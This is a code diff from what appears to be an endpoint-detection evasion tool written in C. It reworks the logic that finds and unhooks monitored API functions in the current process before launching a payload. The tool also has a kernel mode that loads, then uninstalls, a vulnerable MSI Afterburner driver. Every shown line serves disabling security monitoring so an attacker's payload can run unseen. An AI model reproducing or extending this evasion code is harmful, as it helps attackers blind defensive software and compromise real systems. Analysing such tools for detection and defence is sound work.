@@ -177,7 +177,7 @@ Other options:\n\
         }
     }
 
-    // Command line option consistency checks
+    // Command line option consistency checks.
     if (startMode == cmd && !kernelMode) {
         _tprintf(TEXT("'cmd' mode needs kernel-land unhooking to work, please enable --kernelmode\n"));
         return EXIT_FAILURE;
@@ -194,6 +194,19 @@ Other options:\n\
     }
 
     BOOL isSafeToExecutePayload = TRUE;
+
+    if (userMode) {
+        _tprintf(TEXT("Loaded DLLs in current process:\n"));
+        hooks = searchHooks(NULL);
+        _tprintf(TEXT("\n\n"));
+
+        if (startMode != audit) {
+            for (hook* ptr = hooks; ptr->disk_function != NULL; ptr++) {
+                printf("Unhooking %s using method %ld ...\n", ptr->functionName, unhook_method);
+                unhook(ptr, unhook_method);
+            }
+        }
+    }
 
     if (kernelMode) {
         if (_tcslen(driverPath) == 0) {
@@ -263,20 +276,7 @@ Other options:\n\
         }
     }
 
-    if (userMode) {
-        _tprintf(TEXT("Loaded DLLs in current process:\n"));
-        hooks = searchHooks(NULL);
-        _tprintf(TEXT("\n\n"));
-
-    }
-
     if (startMode != audit) {
-        if (userMode) {
-            for (hook* ptr = hooks; ptr->disk_function != NULL; ptr++) {
-                printf("Unhooking %s using method %ld ...\n", ptr->functionName, unhook_method);
-                unhook(ptr, unhook_method);
-            }
-        }
 
         if (isSafeToExecutePayload) {
             _tprintf(TEXT("[+] Process is \"safe\" to launch our payload\n"));
@@ -363,6 +363,8 @@ Other options:\n\
             }
             _tprintf(TEXT("\n\n"));
         }
+
+        // If the the payload is not safe to execute.
         else {
             _tprintf(TEXT("[+] Process is NOT \"safe\" to launch our payload, removing monitoring and starting another process...\n"));
 #ifdef _DEBUG
@@ -487,7 +489,6 @@ Other options:\n\
         }
     }
 
-    // TODO : Fix Windows error 0x00000422 that happens on 1 on 2 restart after uninstall.
     if (kernelMode && removeVulnDriver) {
         Sleep(5000);
         _tprintf(TEXT("[*] Uninstalling vulnerable MSI Afterburner driver...\n"));
